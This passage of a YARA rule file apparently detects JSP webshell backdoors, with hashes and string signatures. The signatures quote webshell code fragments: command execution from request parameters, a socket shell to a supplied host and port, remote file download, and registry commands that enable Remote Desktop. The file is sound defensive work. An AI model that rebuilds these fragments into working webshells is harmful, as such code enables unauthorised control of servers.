        $s7 = "String fName= encodeGb2Unicode((new File(filePath)).getName());" fullword ascii
        $s8 = "</a></span><form method='post'><span style='color:#ffffff'>" fullword ascii
        $s9 = "abFileName[p]=(String)convertPath(files[i].getAbsolutePath());" fullword ascii
        $s10 = "out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),70)+\"</td><td width='40%'><a href='javascript:JsReName" ascii
        $s11 = "DWORD /d 0x\"+dtohex+\" /f\"" fullword ascii
        $s12 = "DWORD /d 0x\"+dtohex+\" /f\"," fullword ascii
        $s13 = "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_D" ascii
        $s14 = "\"+request.getRealPath(\"/\")+\"<br>\");" fullword ascii
        $s15 = "action=(Action==null?\"0\":Action).charAt(0);" fullword ascii
        $s16 = "ter(\"cmd\"))+\"</TEXTAREA></td></tr>\\n\");" fullword ascii
        $s17 = "reFileName[j]=(String)files[i].getName();" fullword ascii
        $s18 = "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v P" ascii
        $s19 = "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\Wds\\\\rdpwd\\\\Tds\\\\tcp\\\" " ascii
        $s20 = "px;margin:100px;'><br><span style='color:#ffffff'>JspSpy V1.0 <br><br><a href='http://www.nohack.cn' style=\\\"color:white;\\\" " ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _3c546df74e37eff27ab1570241e24e1ace9e56e9_f9b9b3cdb3e9a11e528aed1ef68182a0140a4b8d_47
{
    meta:
        description = "jsp - from files 3c546df74e37eff27ab1570241e24e1ace9e56e9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fcd593c52489526b4c83660cba0b22cccb833614ff451c37263d64c726766b77"
        hash2 = "27c8aec29a8312a15eb47b233904396dfacc06013d02e12a4d5b9efdba746f68"
    strings:
        $x1 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
        $s2 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
        $s3 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
        $s4 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
        $s5 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
        $s6 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
        $s7 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
        $s8 = "copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);" fullword ascii
        $s9 = "* @throws UnknownHostException" fullword ascii
        $s10 = "String out = exec(cmd);" fullword ascii
        $s11 = "* @param host" fullword ascii
        $s12 = "cmd /c dir " fullword ascii
        $s13 = "* @param cmd" fullword ascii
        $s14 = "Socket s = new Socket(host,port);" fullword ascii
        $s15 = "* @param port" fullword ascii
        $s16 = "* @throws MalformedURLException" fullword ascii
        $s17 = "* @param fileName" fullword ascii
        $s18 = "return new String(inutStreamToOutputStream(new FileInputStream(path)).toByteArray());" fullword ascii
        $s19 = "* @param in" fullword ascii
        $s20 = "InputStream in = s.getInputStream();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _03b48a3173a919b51278f38a88b7ef5aca4f7d59_19e30ccd0c4695c76a8d02259a446f109df6ba24_2f7b4343c3b3387546d5ce5815048992beab4645__48
{
    meta:
        description = "jsp - from files 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
        hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
        hash3 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
        hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
        hash5 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
        hash6 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash7 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash8 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash9 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
        hash10 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
        hash11 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
        hash12 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
        hash13 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
        hash14 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash15 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash16 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
        hash17 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
        hash18 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash19 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
        hash20 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
        hash21 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
        hash22 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash23 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash24 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
        hash25 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
        hash26 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash27 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
        hash28 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
        hash29 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
        hash30 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
        hash31 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
        hash32 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
        hash33 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $s1 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword ascii
        $s2 = "long time = System.currentTimeMillis() - starttime;" fullword ascii
        $s3 = "UplInfo info = (UplInfo) uploadTable.get(fName);" fullword ascii
        $s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword ascii
        $s5 = "request.setAttribute(\"error\", \"Upload aborted\");" fullword ascii
        $s6 = "UploadMonitor.set(fileInfo.clientFileName, uplInfo);" fullword ascii
        $s7 = "buf.append(conv2Html(st.charAt(i)));" fullword ascii
        $s8 = "uploadTable.put(fName, info);" fullword ascii
        $s9 = "static Hashtable uploadTable = new Hashtable();" fullword ascii
        $s10 = "return convertFileSize(uprate) + \"/s\";" fullword ascii
        $s11 = "public String getTimeElapsed() {" fullword ascii
        $s12 = "public String getTimeEstimated() {" fullword ascii
        $s13 = "uplInfo.currSize += read;" fullword ascii
        $s14 = "static UplInfo getInfo(String fName) {" fullword ascii
        $s15 = "public String getUprate() {" fullword ascii
        $s16 = "long uprate = currSize * 1000 / time;" fullword ascii
        $s17 = "time = totalSize * time / currSize;" fullword ascii
        $s18 = "public int getPercent() {" fullword ascii
        $s19 = "uploadTable.remove(fName);" fullword ascii
        $s20 = "uplInfo.currSize = uplInfo.totalSize;" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _03b48a3173a919b51278f38a88b7ef5aca4f7d59_19e30ccd0c4695c76a8d02259a446f109df6ba24_2f7b4343c3b3387546d5ce5815048992beab4645__49
{
    meta:
        description = "jsp - from files 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
        hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
        hash3 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
        hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
        hash5 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
        hash6 = "7ff4cc8cbe98ffcc3ae3f9e3b9876cff9972f0ba4e082aa63658fb030a269e43"
        hash7 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash8 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash9 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
        hash10 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash11 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
        hash12 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
        hash13 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
        hash14 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
        hash15 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
        hash16 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash17 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash18 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
        hash19 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
        hash20 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash21 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
        hash22 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
        hash23 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
        hash24 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash25 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash26 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
        hash27 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
        hash28 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash29 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
        hash30 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
        hash31 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
        hash32 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
        hash33 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
        hash34 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
        hash35 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $s1 = "String bound = request.getContentType().substring(bstart + 8);" fullword ascii
        $s2 = "int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
        $s3 = "stLine.nextToken(); // Content-Type" fullword ascii
        $s4 = "fileInfo.fileContentType = stLine.nextToken();" fullword ascii
        $s5 = "int clength = request.getContentLength();" fullword ascii
        $s6 = "os.write(previousLine, 0, read - 2);" fullword ascii
        $s7 = "private byte[] fileContents = null;" fullword ascii
        $s8 = "private final int ONE_MB = 1024 * 1;" fullword ascii
        $s9 = "public void setFileContents(byte[] aByteArray) {" fullword ascii
        $s10 = "while (readingContent) {" fullword ascii
        $s11 = "private boolean compareBoundary(String boundary, byte ba[]) {" fullword ascii
        $s12 = "if (read != -1) {" fullword ascii
        $s13 = "boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);" fullword ascii
        $s14 = "if (saveFiles) { // Create the required directory (including parent dirs)" fullword ascii
        $s15 = "if (compareBoundary(boundary, currentLine)) {" fullword ascii
        $s16 = "line = new String(currentLine, 0, read3);" fullword ascii
        $s17 = "int read = sis.readLine(b, 0, b.length), index;" fullword ascii
        $s18 = "ByteArrayOutputStream baos = (ByteArrayOutputStream) os;" fullword ascii
        $s19 = "fileInfo.clientFileName = value;" fullword ascii
        $s20 = "os.write(previousLine, 0, read);" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _03b48a3173a919b51278f38a88b7ef5aca4f7d59_19e30ccd0c4695c76a8d02259a446f109df6ba24_2f7b4343c3b3387546d5ce5815048992beab4645__50
{
    meta:
        description = "jsp - from files 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
        hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
        hash3 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
        hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
        hash5 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
        hash6 = "7ff4cc8cbe98ffcc3ae3f9e3b9876cff9972f0ba4e082aa63658fb030a269e43"
        hash7 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
        hash8 = "35c44ef39b71532afe1dd00b75297871296cffcfdd146bf38b7d4ac765178241"
        hash9 = "b90b999b3d22fc2031ea2af13e3379be2c7d82bbed3544e8ab1c90da4a271750"
        hash10 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
        hash11 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash12 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
        hash13 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
        hash14 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
        hash15 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
        hash16 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
        hash17 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
        hash18 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash19 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash20 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
        hash21 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
        hash22 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash23 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
        hash24 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
        hash25 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
        hash26 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash27 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash28 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
        hash29 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
        hash30 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash31 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
        hash32 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
        hash33 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
        hash34 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
        hash35 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
        hash36 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
        hash37 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $s1 = "System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);" fullword ascii
        $s2 = "fileInfo.setFileContents(baos.toByteArray());" fullword ascii
        $s3 = "boolean readingContent = true;" fullword ascii
        $s4 = "fileContents = new byte[aByteArray.length];" fullword ascii
        $s5 = "stFields = new StringTokenizer(stLine.nextToken(), \"=\\\"\");" fullword ascii
        $s6 = "dataTable.put(paramName, fileInfo);" fullword ascii
        $s7 = "temp = currentLine;" fullword ascii
        $s8 = "previousLine = temp;" fullword ascii
        $s9 = "stFields = new StringTokenizer(field, \"=\\\"\");" fullword ascii
        $s10 = "byte temp[] = null;" fullword ascii
        $s11 = "stLine = new StringTokenizer(line, \";\\r\\n\");" fullword ascii
        $s12 = "byte previousLine[] = new byte[2 * ONE_MB];" fullword ascii
        $s13 = "byte currentLine[] = new byte[2 * ONE_MB];" fullword ascii
        $s14 = "dataTable.put(paramName, line);" fullword ascii
        $s15 = "StringTokenizer stLine = null, stFields = null;" fullword ascii
        $s16 = "stLine = new StringTokenizer(line, \": \");" fullword ascii
        $s17 = "path = dir + File.separator + fileName;" fullword ascii
        $s18 = "stFields.nextToken();" fullword ascii
        $s19 = "paramName = stFields.nextToken();" fullword ascii
        $s20 = "boundary = \"--\" + boundary;" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _0469aa92db9d69692fef21d502f879a7b2566718_0bf6c1e069a14181eb642fa939a059efddc8c82e_275da720a99ed21fd98953f9ddda7460e5b96e5f__51
{
    meta:
        description = "jsp - from files 0469aa92db9d69692fef21d502f879a7b2566718.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6d6c6abcfc5025864b2be74e533c641ce8a00ec8afb6b1e11cd0d191e653e008"
        hash2 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
        hash3 = "dc34856d6d9427af27e8e4369a3a3a333b90adc51482f8c497a1df8aa1e26e09"
        hash4 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
        hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
        hash6 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
        hash7 = "235734c9bcff91f33a8430859299bd30489bf8865279f81571c571b9797d070f"
        hash8 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
        hash9 = "b798b2eef87755b26b30e4d3483582adcc7d0a20d87cb78c8a9cd5c7a32d7730"
        hash10 = "e2267655902470372107057a01a36fe882229f1fc5047ee3215dc2619496e680"
        hash11 = "c61303ebaa7234acd2aea6c5a7cb076c918938f2ace2a966d2dbe4382e766de0"
        hash12 = "7d0aedc6999a16e814f43f63617d4fbff0dc6c70ba4b67b2dd72ca00ad9099e1"
        hash13 = "ad54cd37b150597ec7032b391507addfb6b871711e5cbf28ccb213dd1855ef5c"
        hash14 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
        hash15 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
        hash16 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
        hash17 = "31ce3b5fd44d13657926e93308d43fe0ef6c58559e50ba3029c6f97b35517f99"
    strings:
        $s1 = "proc = runtime.exec(cmd);" fullword ascii
        $s2 = "password = (String)session.getAttribute(\"password\");" fullword ascii
        $s3 = "if (session.getAttribute(\"password\") == null) {" fullword ascii
        $s4 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB2312\"));" fullword ascii
        $s5 = "public String exeCmd(String cmd) {" fullword ascii
        $s6 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword ascii
        $s7 = "session.setAttribute(\"password\", password);" fullword ascii
        $s8 = "Process proc = null;" fullword ascii
        $s9 = "while ((nBytes = in.read(buffer, 0, 1024)) != -1) {" fullword ascii
        $s10 = "public boolean validate(String password) {" fullword ascii
        $s11 = "if (validate(password) == false) {" fullword ascii
        $s12 = "if (password.equals(_password)) {" fullword ascii
        $s13 = "retStr += new String(tmpBuffer, 0, nRet);" fullword ascii
        $s14 = "insReader.close();" fullword ascii
        $s15 = "InputStreamReader insReader = null;" fullword ascii
        $s16 = "String cmd = \"\";" fullword ascii
        $s17 = "public boolean fileCopy(String srcPath, String dstPath) {" fullword ascii
        $s18 = "FileOutputStream out = new FileOutputStream(new File(dstPath));" fullword ascii
        $s19 = "char[] tmpBuffer = new char[1024];" fullword ascii
        $s20 = "FileInputStream in = new FileInputStream(new File(srcPath));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _3b05dd031fdbebfa79614b0035c47052ac60b210_b0456b5fb1b3501c2732e3a64157a95109f175dd_52
{
    meta:
        description = "jsp - from files 3b05dd031fdbebfa79614b0035c47052ac60b210.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
        hash2 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s3 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s4 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s5 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s6 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s7 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s8 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s9 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s10 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s11 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
        $s12 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s13 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
        $s14 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
        $s15 = "BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));" fullword ascii
        $s16 = "return new String(s.getBytes(\"ISO-8859-1\"),cs);" fullword ascii
        $s17 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
        $s18 = "void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception {" fullword ascii
        $s19 = "if(q.indexOf(\"-to:\")==-1){" fullword ascii
        $s20 = "if(q.indexOf(\"--f:\")!=-1){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _03231be47ca1ca2c31e54d037df6fde6041d9a27_ae3e4a01510afef2b72758a070230889f2279cb0_53
{
    meta:
        description = "jsp - from files 03231be47ca1ca2c31e54d037df6fde6041d9a27.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "71dc3008254f4bac53d5c888c0883250d5a81404ff2c944835d19f80b9b83b74"
        hash2 = "3dc6ecb259bfbe4a6433806f5f262e4eedf8c9fac3d0a5e2de0cd89aed857666"
    strings:
        $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
        $s2 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
        $s3 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
        $s4 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
        $s5 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
        $s6 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
        $s7 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
        $s8 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
        $s9 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
        $s10 = "}if(act.equals(\"login\"))" fullword ascii
        $s11 = "String pass=request.getParameter(\"pass\");" fullword ascii
        $s12 = "out.println(\"<font size=3><br></font><input type=text size=54 name='path'><br>\");" fullword ascii
        $s13 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
        $s14 = "session.setAttribute(\"hehe\",\"hehe\");" fullword ascii
        $s15 = "writer.println(content);" fullword ascii
        $s16 = "if(pass.equals(password))" fullword ascii
        $s17 = "String path=request.getParameter(\"path\");" fullword ascii
        $s18 = "{act=request.getParameter(\"act\").toString();}" fullword ascii
        $s19 = "out.println(\"<font size=3 color=red>\"+url2+\"</font><br>\");" fullword ascii
        $s20 = "out.println(\"<font size=3 color=red>save erry!</font>\");" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}
